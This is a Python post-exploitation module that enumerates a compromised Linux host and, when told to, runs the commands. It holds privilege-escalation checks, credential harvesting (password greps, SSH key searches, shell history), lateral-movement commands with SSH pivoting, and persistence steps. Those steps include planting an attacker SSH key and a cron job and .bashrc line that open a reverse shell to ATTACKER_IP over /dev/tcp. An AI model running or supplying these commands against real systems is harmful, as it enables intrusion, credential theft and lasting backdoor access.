"""
Post-Exploitation Module
Privilege escalation, credential harvesting, persistence, lateral movement
"""

import asyncio
import platform
import subprocess
import os
import re
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class PostExploitFinding:
    """Post-exploitation finding"""
    category: str
    description: str
    severity: str
    commands: List[str] = field(default_factory=list)
    artifacts: List[str] = field(default_factory=list)


class PostExploitation:
    """Post-exploitation enumeration and privilege escalation"""
    
    def __init__(self, os_type: Optional[str] = None):
        self.os_type = os_type or platform.system().lower()
        self.findings: List[PostExploitFinding] = []
        
    async def enumerate_system(self) -> Dict[str, Any]:
        """Enumerate system information"""
        
        system_info = {
            'os': self.os_type,
            'hostname': platform.node(),
            'architecture': platform.machine(),
            'python_version': platform.python_version()
        }
        
        commands = {
            'kernel': 'uname -a',
            'users': 'cat /etc/passwd',
            'groups': 'cat /etc/group',
            'sudo_version': 'sudo --version',
            'cron_jobs': 'cat /etc/crontab',
            'network': 'ifconfig -a || ip a',
            'processes': 'ps aux',
            'mounts': 'mount'
        }
        
        for key, cmd in commands.items():
            try:
                result = subprocess.run(
                    cmd, 
                    shell=True, 
                    capture_output=True, 
                    text=True, 
                    timeout=10
                )
                system_info[key] = result.stdout
            except:
                system_info[key] = "Failed to retrieve"
        
        return system_info
    
    def get_privesc_checks_linux(self) -> List[PostExploitFinding]:
        """Linux privilege escalation checks"""
        checks = []
        
        # SUID binaries
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Find SUID/SGID binaries that could be exploited',
            severity='high',
            commands=[
                'find / -perm -u=s -type f 2>/dev/null',
                'find / -perm -g=s -type f 2>/dev/null',
                'find / -perm -4000 -o -perm -2000 -type f 2>/dev/null'
            ],
            artifacts=['Vulnerable SUID binaries: nmap, vim, find, bash, more, less, nano']
        ))
        
        # Writable /etc/passwd
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check if /etc/passwd is writable',
            severity='critical',
            commands=['ls -l /etc/passwd', 'test -w /etc/passwd && echo "WRITABLE"'],
            artifacts=['If writable, can add root user directly']
        ))
        
        # Sudo privileges
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check sudo privileges',
            severity='high',
            commands=[
                'sudo -l',
                'cat /etc/sudoers 2>/dev/null',
                'find /etc/sudoers.d -type f 2>/dev/null | xargs cat'
            ],
            artifacts=['NOPASSWD entries, specific command privileges']
        ))
        
        # Kernel exploits
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check kernel version for known exploits',
            severity='high',
            commands=[
                'uname -r',
                'cat /proc/version',
                'lsb_release -a'
            ],
            artifacts=['DirtyCOW (CVE-2016-5195), CVE-2021-4034 (PwnKit), CVE-2022-0847 (Dirty Pipe)']
        ))
        
        # Cron jobs
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check for writable cron jobs',
            severity='medium',
            commands=[
                'cat /etc/crontab',
                'ls -la /etc/cron.*',
                'crontab -l',
                'find /etc/cron.* -type f -writable'
            ],
            artifacts=['Writable cron scripts running as root']
        ))
        
        # PATH hijacking
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check for PATH hijacking opportunities',
            severity='medium',
            commands=[
                'echo $PATH',
                'find / -writable -type d 2>/dev/null | grep -E "^/|bin|sbin"'
            ],
            artifacts=['Writable directories in PATH before /usr/bin']
        ))
        
        # Credentials in files
        checks.append(PostExploitFinding(
            category='credential_harvesting',
            description='Search for credentials in common locations',
            severity='high',
            commands=[
                'grep -r "password" /home /root /var/www 2>/dev/null | grep -v "Binary"',
                'find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -i "pass\\|pwd\\|credential" 2>/dev/null',
                'cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -i "pass\\|ssh\\|ftp"',
                'find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null'
            ],
            artifacts=['SSH keys, database credentials, API keys']
        ))
        
        # Docker escape
        checks.append(PostExploitFinding(
            category='privilege_escalation',
            description='Check for Docker container escape',
            severity='high',
            commands=[
                'cat /proc/1/cgroup | grep docker',
                'ls -la /.dockerenv',
                'mount | grep docker',
                'docker ps 2>/dev/null',
                'groups | grep docker'
            ],
            artifacts=['Docker socket mounted, privileged container, docker group membership']
        ))
        
        return checks
    
    def get_persistence_techniques(self) -> List[PostExploitFinding]:
        """Get persistence mechanism suggestions"""
        techniques = [
            PostExploitFinding(
                category='persistence',
                description='Add SSH key for persistence',
                severity='high',
                commands=[
                    'mkdir -p ~/.ssh',
                    'echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys',
                    'chmod 600 ~/.ssh/authorized_keys'
                ]
            ),
            PostExploitFinding(
                category='persistence',
                description='Add cron job for reverse shell',
                severity='high',
                commands=[
                    '(crontab -l ; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'") | crontab -'
                ]
            ),
            PostExploitFinding(
                category='persistence',
                description='Modify .bashrc for persistence',
                severity='medium',
                commands=[
                    'echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> ~/.bashrc'
                ]
            )
        ]
        
        return techniques
    
    def get_lateral_movement_commands(self) -> List[PostExploitFinding]:
        """Get lateral movement techniques"""
        commands = [
            PostExploitFinding(
                category='lateral_movement',
                description='Scan internal network',
                severity='medium',
                commands=[
                    'for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" & done',
                    'netstat -tulnp | grep LISTEN'
                ]
            ),
            PostExploitFinding(
                category='lateral_movement',
                description='SSH to other hosts using found keys',
                severity='high',
                commands=[
                    'find / -name "id_rsa" 2>/dev/null',
                    'ssh -i /path/to/key user@internal_host'
                ]
            ),
            PostExploitFinding(
                category='lateral_movement',
                description='Port forwarding for pivoting',
                severity='high',
                commands=[
                    'ssh -L 8080:internal_host:80 user@compromised_host',
                    'ssh -D 1080 user@compromised_host  # SOCKS proxy'
                ]
            )
        ]
        
        return commands
    
    async def run_full_enumeration(self, execute_commands: bool = False) -> Dict[str, Any]:
        """Run full post-exploitation enumeration"""
        
        print(f"\n[POST-EXPLOIT] Starting Post-Exploitation Enumeration")
        print(f"Operating System: {self.os_type.upper()}\n")
        
        # System enumeration
        print(f"[ENUM] Enumerating system information...")
        system_info = await self.enumerate_system()
        
        # Privilege escalation checks
        print(f"\nüîì Checking privilege escalation vectors...")
        privesc_checks = self.get_privesc_checks_linux()
        print(f"‚úÖ Found {len(privesc_checks)} privilege escalation checks")
        
        # Persistence techniques
        print(f"\nüîí Gathering persistence techniques...")
        persistence = self.get_persistence_techniques()
        print(f"‚úÖ Found {len(persistence)} persistence techniques")
        
        # Lateral movement
        print(f"\n‚û°Ô∏è  Gathering lateral movement techniques...")
        lateral_movement = self.get_lateral_movement_commands()
        print(f"‚úÖ Found {len(lateral_movement)} lateral movement techniques")
        
        # Execute commands if requested
        results = {}
        if execute_commands:
            print(f"\n‚ö†Ô∏è  Executing enumeration commands...")
            for check in privesc_checks:
                for cmd in check.commands[:1]:  # Execute only first command of each check
                    try:
                        result = subprocess.run(
                            cmd,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=10
                        )
                        results[cmd] = {
                            'stdout': result.stdout[:500],  # Limit output
                            'stderr': result.stderr[:500],
                            'returncode': result.returncode
                        }
                    except Exception as e:
                        results[cmd] = {'error': str(e)}
        
        return {
            'os_type': self.os_type,
            'system_info': system_info,
            'privilege_escalation': [
                {
                    'category': c.category,
                    'description': c.description,
                    'severity': c.severity,
                    'commands': c.commands,
                    'artifacts': c.artifacts
                }
                for c in privesc_checks
            ],
            'persistence': [
                {
                    'category': p.category,
                    'description': p.description,
                    'severity': p.severity,
                    'commands': p.commands
                }
                for p in persistence
            ],
            'lateral_movement': [
                {
                    'category': l.category,
                    'description': l.description,
                    'severity': l.severity,
                    'commands': l.commands
                }
                for l in lateral_movement
            ],
            'command_results': results if execute_commands else {}
        }